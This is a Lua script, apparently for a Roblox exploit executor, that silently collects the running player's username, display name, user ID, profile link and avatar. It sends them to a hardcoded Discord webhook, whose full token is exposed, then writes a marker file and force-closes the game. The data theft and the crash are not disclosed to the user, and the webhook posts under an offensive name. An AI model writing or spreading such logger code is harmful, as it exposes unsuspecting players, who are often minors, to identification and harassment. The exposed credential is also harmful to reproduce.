local Webhook = "https://discord.com/api/webhooks/1005441542955216956/jlQl5bO820OBJztMtoOOju4qTc9VImmzILd3ma2BpN4OLRqu93p2vEPgPrC6EeI5qMfX" -- your webhook

local executor = identifyexecutor() or "Unknown"
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl
local msg = {
    ["username"] = "Being a pedo",
    ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
    ["content"] = nil,
    ["embeds"] = {
        {
            ["color"] = tonumber(tostring("0x32CD32")), --decimal
            ["title"] = "This Bozo executed.",
            ["thumbnail"] = {
                ["url"] = AvatarImage,
            },
            ["fields"] = {
                {
                    ["name"] = "Username",
                    ["value"] = "||"..game.Players.LocalPlayer.Name.."||",
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = game.Players.LocalPlayer.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "UID",
                    ["value"] = "||["..game.Players.LocalPlayer.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
                    ["inline"] = true
                },
                {
                    ["name"] = "Executor Used",
                    ["value"] = executor,
                    ["inline"] = true
                },
            },
            ['timestamp'] = DateTime.now():ToIsoDate() -- os.date("%Y-%m-%dT%X.000Z")
        }
    }
}

if isfile("Workspace/readthis.txt") then
    game:Shutdown()
    else
    request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    makefolder("Workspace")
    writefile("Workspace/readthis.txt", "true")
    game:Shutdown()
end
